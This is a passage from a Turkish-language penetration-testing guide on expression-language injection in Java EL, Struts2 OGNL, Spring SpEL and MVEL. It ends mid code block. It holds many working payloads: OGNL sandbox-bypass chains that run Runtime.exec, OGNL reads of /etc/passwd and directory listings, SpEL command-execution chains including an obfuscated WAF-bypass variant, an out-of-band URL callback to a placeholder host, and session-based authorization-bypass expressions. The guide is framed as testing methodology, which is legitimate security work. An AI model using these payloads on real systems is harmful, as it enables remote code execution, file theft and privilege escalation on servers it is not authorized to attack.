  JEP 372 ile **JDK 15'te JRE'den tamamen kaldırılmıştır**. Bu yüzden
  JDK 15+ hedeflerde `getEngineByName('js')` **`null` döner** ve bir
  sonraki `.eval(...)` çağrısı `NullPointerException` ile başarısız
  olur — bu, motorun/tekniğin geçersiz olduğu anlamına gelmez, yalnızca
  o JDK sürümünde bu spesifik yolun kapalı olduğu anlamına gelir. JDK
  sürümü bilinmiyorsa veya 15+ ise, alternatif olarak GraalVM JS
  (`getEngineByName('graal.js')`, ayrı bir dependency gerektirir,
  her ortamda bulunmayabilir) denenebilir, ya da bu teknik tamamen
  atlanıp diğer RCE yollarına (Runtime/ProcessBuilder reflection,
  yukarıda) öncelik verilebilir.
  **Not (Java 9+ uyumluluk):** Yukarıdaki üç payload'da (ELProcessor,
  ArrayList, ScriptEngineManager) `Class.newInstance()` yerine
  `getDeclaredConstructor().newInstance()` kullanılmıştır — `Class.newInstance()`
  Java 9+'ta module system ile birlikte deprecated'tır ve bazı
  ortamlarda `IllegalAccessException` fırlatabilir; `getDeclaredConstructor().newInstance()`
  tüm modern JDK sürümlerinde tutarlı çalışan, tercih edilen formdur.
- **Impact örneği — RCE olmadan authorization bypass (session
  manipülasyonu, klasik RCE'den bağımsız ayrı bir etki türü, bkz.
  §10.4):** Uygulama session attribute'larını EL context'inden
  değiştirilebilir kılıyorsa, bir yetki yükseltme mümkün olabilir:
  ```
  ${pageContext.request.getSession().setAttribute("admin", true)}
  ```
  Bu tarz bir bulgu, RCE payload'ları çalışmasa bile (örn. sandbox'lı
  bir context'te) tek başına **confirmed, yüksek etkili** bir EL
  Injection bulgusu olarak raporlanmalıdır.
- **PrimeFaces'e özgü — EL Injection'ın ViewState şifreleme zaafından
  yararlanılan bilinen kalıp (gerçek dünya vaka analizi):** PrimeFaces
  bazı sürümlerde ViewState'i zayıf/varsayılan bir anahtarla şifreler.
  Bir saldırgan bu anahtarı elde edebilir/tahmin edebilirse
  (default/well-known anahtar kullanımı, ya da anahtarın başka bir
  yoldan sızması), kendi ürettiği bir ViewState payload'ını
  şifreleyip sunucuya gönderebilir; sunucu bunu decrypt edip
  içindeki EL ifadesini **doğrudan `ELProcessor.eval()` ile
  çalıştırır**. Bu, "attacker-controlled serialized EL expression"
  desenidir — deserialization'dan farklıdır (obje grafiği değil, ham
  bir EL ifadesi string'i çalıştırılır), ama post-authentication
  bir decrypt/forge adımı gerektirir. Test ederken önce uygulamanın
  hangi şifreleme anahtarını kullandığını (default mu, uygulamaya
  özel mi) doğrula — bu, spesifik sürüm/advisory kimliği kasıtlı
  olarak verilmeden burada davranışsal olarak açıklanmıştır (bkz.
  §15 CVE/versiyon iddiaları notu).
- **`ImportHandler`/static import abuse (WAF bypass — B13):** Bazı
  filtreler yalnızca `Runtime`/`ProcessBuilder` gibi literal
  string'leri arar. `ELProcessor.defineFunction`/`ImportHandler` API'si
  (erişilebiliyorsa) dolaylı bir static import mekanizması sunar —
  sınıf adı farklı bir API çağrısı içine gizlenerek blacklist
  atlatılabilir.
- **Sandbox:** Java EL'in SpEL (`SimpleEvaluationContext`) veya OGNL
  (`#_memberAccess`) gibi **native/standart bir sandbox API'si
  yoktur** — `ELProcessor`/reflection'a doğrudan erişim genelde
  mümkündür. Ama bu, hedefte hiçbir kısıtlama olamayacağı anlamına
  gelmez: uygulama kendi özel `ELResolver` implementasyonunu takabilir,
  JVM/container seviyesinde (security manager, module system) erişim
  kısıtlanabilir, veya expose edilen obje ağacı zaten dar olabilir —
  bu kısıtlamalar Java EL spesifikasyonunun **kendisinden değil**,
  uygulamaya özgü (application-specific) katmanlardan gelir; P4
  (object-discovery) aşamasında bu her zaman ayrıca doğrulanmalıdır.
- **Version/Configuration notu:** Jakarta EE 9 ile `javax.el.*` paket
  isim alanı `jakarta.el.*` olarak değişmiştir — hedefin hangi paket
  adını kullandığı (stack trace'ten görülür) hem fingerprint hem
  doğru reflection payload'ı seçimi için önemlidir.

### 12.2 OGNL (Object-Graph Navigation Language) — Struts2, Confluence, Apache Camel

> Ekosistem: Apache Struts2/WebWork (OGNL'in en yaygın kullanıldığı
> framework — parametre binding mekanizmasının çekirdeğidir),
> Atlassian Confluence (bazı bileşenlerde), Apache Camel (`ognl`
> language component'i), OpenSymphony XWork.

- **Technology fingerprint:** `.action` URL uzantısı, `struts.xml`
  referansları, `X-Powered-By` veya hata sayfalarında
  `com.opensymphony.xwork2`, Confluence footer'ında sürüm bilgisi.
- **Delimiter:** OGNL'in kendisi delimiter'sız çıplak bir ifade
  dilidir (`6666*6666` doğrudan geçerli bir OGNL ifadesidir); ama
  Struts2 context'inde parametre değerleri genelde `%{...}` ile
  **işaretlenerek** OGNL olarak evaluate edilir (Struts2'nin "Always
  evaluate OGNL" davranışı, sürüme/konfigürasyona göre değişir —
  bazı context'lerde `%{...}` işareti olmadan da doğrudan evaluate
  edilebilir, bu daha ciddi bir zafiyettir).
- **Generic detection:**
  ```
  %{6666*6666}
  %{44444444-8888}
  6666*6666               (delimiter'sız, context'e göre)
  %{'AAA_'+'44435556'}
  ```
- **Context değişkeni fingerprint'i (Strong indicator):**
  ```
  %{#context}
  %{#request}
  %{#session}
  %{#_memberAccess}
  ```
  `#_memberAccess` adı özellikle OGNL/Struts2'ye çok özgüdür —
  görülmesi güçlü bir Strong indicator'dır.
- **Diğer sık kullanılan context değişkenleri ve OGNL'e özgü
  sözdizimi özellikleri:**
  ```
  #parameters.INJPARAM[0]     (HTTP parametre değerlerine doğrudan erişim)
  #attr.propertyName           (page/request/session/application attribute erişimi)
  top                           (ValueStack'in en üstündeki root object referansı)
  users.{? #this.age > 18}      (collection selection/filtering — koşulu sağlayanları seç)
  users.{name}                  (collection projection — her elemandan bir alan çıkar)
  @java.lang.Thread@sleep(10000) (timing primitive, process spawn gerektirmez)
  ```
  Collection projection/selection sözdizimi (`.{? ...}`, `.{...}`),
  hem P4 (object-discovery — context'te bir collection'a erişilebiliyor
  mu) hem de OGNL'e özgü bir Strong indicator sağlar; çoğu diğer EL
  motorunda (SpEL hariç, SpEL'in kendi projection/selection sözdizimi
  farklıdır: `.?[...]`/`.![...]`) bu sözdizimi desteklenmez.
- **Error signatures (Strong indicator):** `ognl.OgnlException`,
  `ognl.MethodFailedException`, `ognl.NoSuchPropertyException`,
  `com.opensymphony.xwork2.util.ValueStack`.
- **`#_memberAccess` kısıtlaması — Struts2'nin ana savunma mekanizması
  ve bilinen bypass desenleri (iki eşdeğer yaklaşım):** Struts2, OGNL'in
  tehlikeli statik metot erişimini (`@java.lang.Runtime@`) engellemek
  için `SecurityMemberAccess`/`#_memberAccess.excludedClasses` gibi bir
  blacklist/whitelist mekanizması kullanır. İki bilinen bypass yolu:

  **Yol A — kanonik/en yaygın kullanılan yöntem:** `#_memberAccess`
  değişkeninin **tamamını**, `OgnlContext` sınıfının kendi kısıtlamasız
  varsayılan `DEFAULT_MEMBER_ACCESS` static alanıyla **değiştirmek**
  (alan alan düzenlemek yerine tüm objeyi baştan atamak — daha kısa ve
  birçok sürümde daha güvenilir çalışır):
  ```
  %{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
    #rt=@java.lang.Runtime@getRuntime(),
    #rt.exec('id')}
  ```
  **Yol B — hedefli alan düzenleme (Yol A çalışmadığı bazı
  sürümlerde/konfigürasyonlarda alternatif):** Korumayı **kendi
  context'i içinden** devre dışı bırakmak için `_memberAccess`'in
  kendi alanlarını (`allowStaticMethodAccess`, `excludedClasses`,
  `excludedPackageNames`) OGNL üzerinden **yeniden yazmak**, ardından
  asıl RCE payload'ını çalıştırmak:
  ```
  (#_memberAccess["allowStaticMethodAccess"]=true,
   #foo=new java.lang.Boolean("false"),
   #context["xwork.MethodAccessor.denyMethodExecution"]=#foo,
   #rt=@java.lang.Runtime@getRuntime(),
   #rt.exec('id'))
  ```
  Her iki tekniğin tam çalışması Struts2/OGNL sürümüne göre değişir —
  bazı sürümlerde her iki alana doğrudan yazma da kısıtlanmıştır, o
  durumda `ognl.OgnlContext.setMemberAccess(...)` gibi bir üst
  seviye reflection zincirine ihtiyaç duyulabilir. Hedefte önce Yol
  A denenmeli (daha kısa, filtre tarafından yakalanma ihtimali daha
  düşük), negatif dönerse Yol B'ye geçilmelidir.

  **Yol C — modern/güncel sürümler (Struts 2.5.22+ ve 6.x, `SecurityMemberAccess`
  sınıfı yeniden yazıldığı için Yol A/B'nin başarısız olduğu durumlarda):**
  Bu sürümlerde `DEFAULT_MEMBER_ACCESS`'i doğrudan atamak veya
  `_memberAccess`'in ayrı alanlarını yeniden yazmak artık genelde
  engellenir. Bunun yerine `#_memberAccess`'in kendisini **tamamen
  farklı, kısıtlamasız bir `MemberAccess` implementasyonuyla**
  değiştirmek gerekebilir:
  ```
  %{#_memberAccess=new ognl.DefaultMemberAccess(true),
    #rt=@java.lang.Runtime@getRuntime(),
    #rt.exec('id')}
  ```
  `new ognl.DefaultMemberAccess(true)`, Struts'ın kendi güvenlik
  katmanını (`SecurityMemberAccess`) hiç kullanmadan, OGNL'in ham
  varsayılan erişim davranışını yeniden kurar. Bu üç yol (A/B/C)
  sırayla denenmeli; hangisinin çalıştığı hedefin tam sürümüne göre
  değişir ve bu **false-negative riskini** azaltmak için önceden
  tahmin etmek yerine hepsi sırayla test edilmelidir.

  **Not:** `ognl.DefaultMemberAccess`, OGNL kütüphanesinin genel
  (public) API'sinin bir parçasıdır ve kamuya açık Struts2 CVE
  PoC'larında (ör. S2-053/CVE-2017-12611) bu şekilde kullanılmıştır.
  Çalışıp çalışmaması, tıpkı Yol A/B gibi, hedefin tam OGNL/Struts2
  sürümüne ve olası shaded/relocated paket yapılandırmasına bağlıdır
  — hedefte doğrulanmalıdır, negatif dönerse Yol A/B'ye geri dönülür.
- **RCE / confirmation (temel, kısıtlama yoksa doğrudan çalışır):**
  ```
  %{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
  @java.lang.Runtime@getRuntime().exec('id')
  ```
- **Çıktı okuma (process InputStream'ini string'e çevirme):**
  ```
  (#rt=@java.lang.Runtime@getRuntime()).
  (#process=#rt.exec('id')).
  (#is=#process.getInputStream()).
  (#br=new java.io.BufferedReader(new java.io.InputStreamReader(#is))).
  (#out=@org.apache.commons.io.IOUtils@toString(#br))
  ```
- **Blind detection — Thread.sleep ile timing (bkz. §9.2 genel
  metodoloji, OGNL'e özgü somut payload):**
  ```
  %{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
    #kzxs=@java.lang.Thread@sleep(10000),
    1?#xx:#request.toString}
  ```
  Sonundaki `1?#xx:#request.toString` üçlü operatör deseni, `#kzxs`
  atamasının yan etkisini (sleep'in çalışması) garanti ederken
  response'un normal akışına devam etmesini sağlar — bilinen ve
  güvenilir bir OGNL blind-injection kalıbıdır.

  **Önemli — `#xx` KASITLI olarak tanımsız bırakılmıştır, bu bir yazım
  hatası değildir:** `#xx` diye bir değişken hiçbir yerde atanmamıştır
  ve bu **bilinçlidir** — `1` her zaman true olduğu için `#xx`
  evaluate edilir, tanımsız olduğu için OGNL bunu `null` olarak
  döndürür. Bu null dönüş, Struts2'nin ValueStack'inin `#kzxs`
  (Thread'in `sleep()` çağrısından dönen değer, tip olarak sorunlu
  olabilir) gibi beklenmedik bir tipi response'a render etmeye
  çalışıp bir tip-dönüşüm hatası fırlatmasını engeller — yani payload
  "sessiz" kalır. Bu, kamuya açık Struts2/OGNL exploit script'lerinde
  standart olarak kullanılan bir tekniktir. `#xx`'i `#kzxs` ile
  değiştirmek (yani `#xx` yerine zaten tanımlı bir değişken kullanmak)
  bu deseni **bozar** — bu durumda `#kzxs`'in kendisi (sleep sonucu)
  render edilmeye çalışılır ve tip uyuşmazlığı hatası riski geri döner.
  `#xx` isminin kendisi önemli değildir (herhangi bir tanımsız
  değişken adı işe yarar), önemli olan **gerçekten tanımsız olmasıdır**.
- **Dosya okuma (Remote File Inclusion — sunucu üzerindeki herhangi
  bir dosyayı okuma, `java.io.File`/`FileInputStream` zinciriyle):**
  ```
  %{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
    #f=new java.io.File('/etc/passwd'),
    #fis=new java.io.FileInputStream(#f),
    #len=new java.lang.Long(#f.length()),
    #buf=new byte[#len.intValue()],
    #fis.read(#buf),
    #fis.close(),
    #out=new java.lang.String(#buf)}
  ```
  Bu, hem P4 (object-discovery — dosya sistemine erişim var mı) hem
  de doğrudan bir P6 (impact) kanıtı sağlar; okunan dosya içeriği
  response'ta bir değişkende (`#out`) tutulur, uygulamanın bunu geri
  yansıtıp yansıtmadığına bağlı olarak görünür olabilir.
- **Directory listing (bir dizindeki dosyaları listeleme —
  `File.listFiles()` ile):**
  ```
  %{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
    #f=new java.io.File('/var/www'),
    #files=#f.listFiles(),
    #out=@java.util.Arrays@toString(#files)}
  ```
- **J2EEScan-stili otomatik detection vektörü (araç geliştirme/
  entegrasyon referansı):** Bilinen bir otomatik tarayıcı yaklaşımı,
  response body'sinin bir kısmını çalışma zamanında (parametre
  değerine bağlı) **değiştirip** kontrollü bir toplam üretmektir —
  bu, differential comparison'ın (§5.1) bir OGNL'e özgü somut
  uygulamasıdır:
  ```
  PRE-${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
    #kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),
    #kzxs.print(#parameters.INJPARAM[0]),
    #kzxs.print(new java.lang.Integer(829+9)),
    #kzxs.close(),
    1?#xx:#request.toString}-POST
  ```
  (`INJPARAM` adlı ayrı bir parametre ile birlikte gönderilir; başarılı
  evaluation'da response'ta `INJPARAM` değeri + `838` (829+9) görünür —
  bu da §5.1'deki "farklı bir sayı ile farklı sonuç" negatif kontrol
  prensibinin otomatik bir uygulamasıdır.)
- **Apache Camel `ognl` language bağlamı:** Camel route tanımlarında
  `.setBody(ognl("...")))` gibi bir kullanım, route XML'i veya
  header/property üzerinden gelen bir değeri doğrudan OGNL'e
  besleyebilir — bu, klasik "config/route tanımı üzerinden dolaylı
  EL Injection" desenidir (bkz. §11); route tanımının kendisi
  kullanıcı girdisinden türetiliyorsa (örn. bir dinamik entegrasyon
  builder UI'ı) risk oluşur.
- **Confluence bağlamı:** Bazı Confluence sürümlerinde belirli
  admin/webhook endpoint'leri kullanıcı girdisini OGNL context'ine
  besleyen bir doğrulama zincirinden geçirir — spesifik endpoint/
  sürüm bilgisi hızla eskidiği için burada verilmemiştir (bkz. §15);
  genel OGNL fingerprint ve RCE tekniği yukarıdakiyle aynıdır.
- **`params` interceptor'ının `acceptedParamNames` savunması —
  `#_memberAccess`'ten AYRI, ikinci bir savunma katmanı:** Struts2'nin
  `params` interceptor'ü, parametre isimlerini bir regex ile
  (tipik olarak `\w+((\.\w+)|(\[\d+\])|(\('.+'\)))*` benzeri bir
  desen) filtreler; bu, `class.classLoader` gibi tehlikeli property
  zincirlerinin parametre **ismi** olarak doğrudan gönderilmesini
  engellemeyi amaçlar (bu, `#_memberAccess`'ten farklı bir mekanizmadır
  — biri OGNL'in runtime erişim kontrolü, diğeri parametre isminin
  regex ile ön-filtrelenmesidir). Bilinen bypass yönü: parametre
  değerinin **kendisi** (ismi değil) OGNL context'inde ayrıca evaluate
  ediliyorsa, veya array-index/bracket erişimi (`["class"]`) regex'in
  beklemediği bir sözdizimiyle aynı property zincirine ulaşabiliyorsa
  (bkz. §8.2.1 B15 — Array-index property access, aynı ilke). Bu iki
  savunma katmanının (regex + `#_memberAccess`) **ikisinin de**
  aktif/pasif durumu ayrı ayrı test edilmelidir — biri bypass edilse
  bile diğeri hâlâ engelliyor olabilir.
- **Sandbox:** Struts2'nin `#_memberAccess` mekanizması dışında OGNL'in
  kendisinde native bir sandbox yoktur — güvenlik tamamen ev sahibi
  framework'ün (Struts2) uyguladığı whitelist/blacklist katmanına
  bağlıdır.

### 12.3 SpEL (Spring Expression Language) — Spring Framework Ekosistemi

> Ekosistem: Spring Framework (core), Spring Boot, Spring Security
> (`@PreAuthorize`/`@PostAuthorize` ifadeleri), Spring Data
> (`@Query` özel ifadeleri, `Sort`/`Pageable` bazı entegrasyonlar),
> Spring Batch, Spring Integration, Spring Cloud (Gateway, Function,
> Config Server), Spring WebFlow.

- **`@Value` içinde `${...}` ile `#{...}` ayrımı — KRİTİK KARIŞIKLIK
  NOKTASI:** Spring kaynak kodunda/konfigürasyonunda görülen iki
  sözdizimi **tamamen farklı mekanizmalardır**:

  ```
  @Value("${property.name}")   → Property Placeholder çözümleme
                                   (PropertySourcesPlaceholderConfigurer)
                                   — varsayılan olarak SpEL DEĞİLDİR,
                                   config değerini string olarak yerine
                                   koyar, expression evaluate ETMEZ.
                                   ANCAK bu tek başına "injection sink'i
                                   değildir" sonucuna varmak için
                                   YETERLİ DEĞİLDİR — aşağıdaki nested/
                                   composed istisnası kontrol edilmeden
                                   bu sınıflandırma kesinleştirilemez.
  @Value("#{expression}")      → SpEL — expression parser'a gider,
                                   gerçek SpEL Injection sink'i BUDUR
  ```
  Bu ayrım önemlidir çünkü: (a) bir kod incelemesinde/kaynak sızıntısında
  yalnızca `${...}` görülüyorsa bu bir SpEL sink'i değildir, zaman
  kaybetmemek gerekir; (b) bazı geliştiriciler bu ikisini karıştırıp
  `${...}` içine kullanıcı girdisi koyduğunu (ve bunun "sadece
  property" olduğu için güvenli olduğunu) düşünür, ama eğer property
  placeholder'ın kendisi kullanıcı girdisinden geliyorsa VE Spring'in
  `${...}` içinde iç içe `#{...}` çözümlemesi aktifse (nested/composed
  property + SpEL, bazı yapılandırmalarda mümkündür), zincir yine SpEL
  Injection'a çıkabilir — bu durumda kaynak `${...}` olsa da nihai
  sink SpEL parser'ıdır.

- **Technology fingerprint:** `X-Application-Context` header'ı
  (eski Spring Boot Actuator), `/actuator` endpoint'leri, hata
  sayfalarında `org.springframework` paket adları, `Whitelabel Error
  Page` (Spring Boot default hata sayfası).
- **Actuator `/jolokia` ve `/logview` — spesifik tarihsel SpEL sink'i:**
  Eski Spring Boot Actuator sürümlerinde (özellikle Actuator 1.x
  dönemi) `/jolokia` endpoint'i JMX bean'lerine HTTP üzerinden erişim
  sağlar; bazı JMX MBean operasyonları arka planda `StandardEvaluationContext`
  ile SpEL evaluate eder, bu yüzden Jolokia üzerinden geçen bir
  parametre zinciri dolaylı bir SpEL Injection sink'i olabilir. Benzer
  şekilde bazı `/logview`/log-görüntüleme eklentileri, log dosyası
  yolunu veya filtre ifadesini kullanıcıdan alıp bir expression olarak
  değerlendirmiştir (CVE geçmişi hızla eskidiği için sürüm numarası
  burada verilmemiştir, bkz. §15). Aktif `/jolokia` tespit edildiğinde,
  bu skill'in genel SpEL fingerprint/RCE zincirini bu endpoint'in
  kabul ettiği parametrelere de uygulamak gerekir.
- **Delimiter:** `#{ }` — bean tanımlarında (`@Value("#{...}")`) ve
  bazı template context'lerinde standart syntax; ama SpEL'in kendisi
  de OGNL gibi **delimiter'sız çıplak ifade** kabul eder (bir
  `ExpressionParser.parseExpression(raw_string)` çağrısına doğrudan
  string geçildiğinde delimiter gerekmez) — bu, Spring Data
  `?sort=` gibi doğrudan parser'a giden parametrelerde geçerlidir.
- **Generic detection:**
  ```
  #{6666*6666}
  #{44444444-8888}
  6666*6666                     (delimiter'sız context, örn. ?sort=)
  #{'AAA_'+'44435556'}
  ```
- **`T(...)` operatörü — SpEL'in en ayırt edici Strong indicator'ı:**
  `T(...)` (Type operatörü), tam nitelikli bir sınıfa static erişim
  sağlar ve bilinen EL motorları arasında **bu tam sözdizimiyle
  yalnızca SpEL'de** görülür (OGNL'in `@Class@` sözdizimine denk
  gelir ama sözdizimi farklıdır) — bu nedenle `T(java.lang.Math)`
  gibi zararsız bir static erişimin çalışıp çalışmadığını test etmek,
  hem P4 (object-discovery) hem de Strong fingerprint sinyali sağlar.
  **Ama bu, dosyanın genel fingerprinting felsefesiyle tutarlı olarak,
  mutlak/deterministic bir sınıflandırma değildir** — `T(...)`'in
  çalıştığı gözlemi, bilinen bir custom/wrapper evaluator'ın aynı
  sözdizimini taklit etmesi ihtimaline karşı, mümkünse bir hata
  imzası (§7) veya framework fingerprint'i (§13) ile
  desteklenmelidir; `T(...)` çalıştı diye tek başına "motor kesin
  SpEL" sonucuna varmak, dosyanın "fingerprint bir ranking'dir,
  deterministic classification değildir" ilkesine aykırı olur:
  ```
  T(java.lang.Math).PI
  T(java.lang.System).currentTimeMillis()
  ```
- **Error signatures (Strong indicator):**
  `org.springframework.expression.spel.SpelEvaluationException`,
  `org.springframework.expression.spel.SpelParseException`,
  `org.springframework.expression.spel.standard.SpelExpressionParser`.
- **Bilgi toplama:**
  ```
  #{systemProperties}
  #{systemEnvironment}
  T(java.lang.System).getenv()
  T(java.lang.System).getProperty('user.dir')
  ```
- **RCE / confirmation (temel, `StandardEvaluationContext`
  kullanılıyorsa doğrudan çalışır):**
  ```
  T(java.lang.Runtime).getRuntime().exec('id')
  new java.lang.ProcessBuilder('id').start()
  ```
- **Çıktı okuma (process InputStream'ini string'e çevirme, external
  kütüphane gerektirmeyen saf Java yolu):**
  ```
  new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id')
    .getInputStream()).useDelimiter('\\A').next()
  ```
  Alternatif (Scanner'ın boş çıktıda `NoSuchElementException`
  fırlatma riskine karşı, satır satır okuyan bir alternatif —
  yalnızca ilk satırı döner, çok satırlı çıktı için döngü gerekir):
  ```
  new java.io.BufferedReader(new java.io.InputStreamReader(
    T(java.lang.Runtime).getRuntime().exec('id').getInputStream())).readLine()
  ```
  Apache Commons IO mevcutsa (Spring projelerinde çok yaygın bir
  transitive dependency):
  ```
  T(org.apache.commons.io.IOUtils).toString(
    T(java.lang.Runtime).getRuntime().exec('id').getInputStream())
  ```
- **RCE / confirmation — karakter-kodu obfuscation ile WAF bypass
  (bkz. §8.2.1 B7, komut string'ini karakter kod noktalarından inşa
  ederek `"exec"`/komut adı gibi literal string'leri filtreden
  gizleme, ayrıca process çıktısını doğrudan HTTP response'a yazma):**
  ```
  T(org.springframework.util.StreamUtils).copy(
    T(java.lang.Runtime).getRuntime().exec(
      "cmd " + T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))
      + "c " + T(java.lang.String).valueOf(new char[]{
          T(java.lang.Character).toChars(100)[0],
          T(java.lang.Character).toChars(105)[0],
          T(java.lang.Character).toChars(114)[0]})
    ).getInputStream(),
    T(org.springframework.web.context.request.RequestContextHolder)
      .currentRequestAttributes().getResponse().getOutputStream())
  ```
  Bu payload aynı zamanda çıktının **doğrudan HTTP response stream'ine
  yazılması** tekniğini gösterir — process InputStream'ini önce bir
  string'e çevirip sonra uygulamanın onu reflect etmesini beklemek
  yerine, `RequestContextHolder` üzerinden aktif response'a doğrudan
  erişilir; bu, uygulamanın normalde EL sonucunu response'a
  yansıtmadığı (blind göründüğü) durumlarda bile çıktı elde etmeyi
  sağlayabilir.
- **`SimpleEvaluationContext` kısıtlaması — Spring'in ana savunma
  mekanizması (KRİTİK NEGATIVE INDICATOR NOTU):** Spring 4.1+
  sürümünden itibaren SpEL'i güvenli kullanmak için iki farklı
  `EvaluationContext` sunar:
  - `StandardEvaluationContext` — **tüm** SpEL özelliklerine izin
    verir (method invocation, `T(...)`, constructor çağrısı, bean
    resolution). Bu context kullanılıyorsa yukarıdaki tüm payload'lar
    doğrudan çalışır.
  - `SimpleEvaluationContext` — **kasıtlı olarak kısıtlanmıştır**:
    `T(...)` operatörü, static metot erişimi ve constructor çağrısı
    **devre dışıdır**. Yalnızca özellik okuma/yazma ve basit metot
    çağrıları desteklenir.
  Bir hedefte `T(java.lang.Runtime)` çalışmıyor ama `#{6666*6666}`
  çalışıyorsa → bu **SpEL'i elemez**, `SimpleEvaluationContext`
  kullanıldığını gösterir (bkz. §7 Negative Capability Matrix ilkesi).
  Bu durumda RCE aranmaz, ama **property/method access injection**
  (context'e expose edilmiş obje ağacı üzerinden bilgi sızıntısı)
  hâlâ mümkün olabilir — kapsam SpEL Injection olarak kalır, yalnızca
  impact daha düşüktür.

  **KRİTİK NÜANS — `SimpleEvaluationContext` "kısıtlanmış" demek
  "method invocation kesinlikle kapalı" demek değildir:**
  `SimpleEvaluationContext`'in üç farklı oluşturma varyantı vardır ve
  bunlardan biri method invocation'ı **yeniden açar**:
  ```
  SimpleEvaluationContext.forReadOnlyDataBinding()   → yalnızca property okuma, method YOK
  SimpleEvaluationContext.forReadWriteDataBinding()   → property okuma/yazma, method YOK
  SimpleEvaluationContext.forPropertyAccessors(...).withInstanceMethods()
                                                       → method invocation AÇIK (ama T(...)/static/constructor hâlâ kapalı)
  ```
  Yani `T(java.lang.Runtime)` başarısız olsa bile, hedef obje üzerinde
  **instance method** çağrısı deneyen bir payload (ör. `#root.exec('id')`
  gibi, context'e expose edilen objenin kendi metodu üzerinden, `T(...)`
  gerektirmeden) hâlâ çalışabilir — `withInstanceMethods()`
  kullanılıyorsa. Bu yüzden `T(...)` başarısız olduğunda hemen "RCE yok"
  sonucuna varılmaz; P4 aşamasında context'e expose edilen objenin
  kendi (static olmayan) metotları da ayrıca denenmelidir.
- **Bean reference (`@`) ile Spring context erişimi — `T(...)`'e
  alternatif, ayrı bir Strong indicator:** SpEL, `@beanName` sözdizimiyle
  Spring application context'teki herhangi bir bean'e doğrudan erişim
  sağlar; bu, `StandardEvaluationContext` ile `BeanResolver` birlikte
  yapılandırıldığında çalışır (Spring web context'lerinde bu genelde
  varsayılan olarak mevcuttur):
  ```
  @environment.getProperty('user.name')
  @systemProperties['java.version']
  ```
  Spring Security context'i aktifse (authentication/authorization
  ifadelerinin evaluate edildiği bağlamlarda):
  ```
  authentication.name
  hasRole('ADMIN')
  ```
  (`authentication`/`hasRole` yalnızca Spring Security'nin kendi SpEL
  root object'inde expose edilir — bu yüzden bu payload'lar özellikle
  `@PreAuthorize`/`@PostAuthorize` bağlamında anlamlıdır, genel bir
  `@Value("#{...}")` sink'inde çalışmaz.)
- **Daha güvenli timing primitive (process spawn etmeden):**
  ```
  T(java.lang.Thread).sleep(10000)
  ```
  Bazı filtreleme/sandbox katmanları spesifik olarak `Thread.sleep`
  imzasını hedefleyebilir; bu durumda aynı etkiyi veren bir alternatif:
  ```
  T(java.util.concurrent.TimeUnit).SECONDS.sleep(10)
  ```
- **OOB için `exec()`'ten daha az iz bırakan alternatif (saf Java,
  process spawn gerektirmez):**
  ```
  new java.net.URL('http://COLLABORATOR_DOMAIN/x').openConnection().connect()
  ```
- **Spring Security `@PreAuthorize`/`@PostAuthorize` bağlamı —
  authorization bypass deseni:** Bu annotation'lar SpEL ifadeleri
  kabul eder (örn. `@PreAuthorize("hasRole('ADMIN')")`). Eğer bir
  uygulama bu ifadeyi **dinamik olarak** (örn. bir veritabanı
  kaydından, bir admin panelinden) oluşturuyorsa ve bu kayıt
  kullanıcı girdisine dayanıyorsa, saldırgan kendi SpEL ifadesini
  yetkilendirme kontrolüne enjekte edebilir — bu hem klasik RCE
  potansiyeli taşır hem de doğrudan bir **authorization bypass**
  olarak sınıflandırılmalıdır (raporda her iki etki de belirtilmeli).
- **Spring Data `Sort`/`Pageable` bağlamı — yaygın gerçek dünya sink'i:**
  Bazı Spring Data entegrasyonları (özellikle özel `Sort` işleme
  mantığı yazılmış uygulamalarda, framework'ün kendisinin varsayılan
  davranışında değil) `?sort=` parametresini doğrudan bir SpEL
  ifadesi olarak evaluate edebilir hale getirilmiş olabilir — bu
  application-specific bir yanlış kullanımdır, framework'ün kendisi
  varsayılan olarak bunu yapmaz; ama gözlemlenen bir sink pattern'i
  olduğu için §2'deki yüksek öncelikli parametre listesinde
  `sort`/`orderBy` bu yüzden yer alır.
- **Spring Cloud Function `routing-expression` bağlamı:** Bkz. §11
  Modern Mimari Notları — bazı sürüm/konfigürasyonlarda bir HTTP
  header üzerinden routing için SpEL ifadesi kabul edilir; bu, uzaktan
  tetiklenebilir bir doğrudan SpEL Injection sink'idir (header
  değeri doğrudan `StandardEvaluationContext` ile evaluate edilir).
- **Sandbox:** Yok (native anlamda) — güvenlik tamamen hangi
  `EvaluationContext` tipinin kullanıldığına bağlıdır (yukarıdaki
  not). Bu, Twig/Freemarker'daki "opsiyonel sandbox extension"
  modelinden farklı bir güvenlik modelidir — burada "sandbox" bir
  eklenti değil, **API seçimi**dir.

### 12.4 MVEL (MVFLEX Expression Language) — Drools, JBPM, Apache Camel

> Ekosistem: Drools (kural motoru — MVEL, DRL dosyaları içinde bir
> ifade dili olarak kullanılır), JBPM/Activiti (iş akışı motorları),
> OptaPlanner, Apache Camel (`mvel` language component'i), bazı eski
> Struts2 entegrasyonları, Solr (eski sürümlerde bazı fonksiyon
> sorgularında).

- **Technology fingerprint:** Drools/JBPM kullanan uygulamalarda
  `.drl` dosya referansları, `KieSession`/`KieContainer` hata
  mesajları, Camel route'larında `mvel:` prefix'i.
- **Delimiter:** MVEL de delimiter'sız çıplak bir ifade dilidir;
  bazı entegrasyonlarda (template modu) `@{ }` kullanılabilir.
- **Generic detection:**
  ```
  6666*6666
  44444444-8888
  'AAA_'+'44435556'
  @{6666*6666}          (template modu context'i)
  ```
- **Java benzeri sözdizimi — ayırt edici Medium/Strong indicator:**
  MVEL, Java'ya çok yakın bir sözdizimi destekler — `new` anahtar
  kelimesiyle doğrudan nesne oluşturma, bu OGNL/SpEL'den farklı bir
  ayırt edici sinyaldir:
  ```
  new java.lang.String("MVEL_TEST")
  ```
  Bu çalışıyorsa (ve `T(...)`/`@Class@` çalışmıyorsa) MVEL olasılığı
  güçlenir.
- **MVEL'e özgü ek sözdizimi özellikleri (Strong indicator'lar,
  diğer EL motorlarında karşılığı olmayan sözdizimi):**
  ```
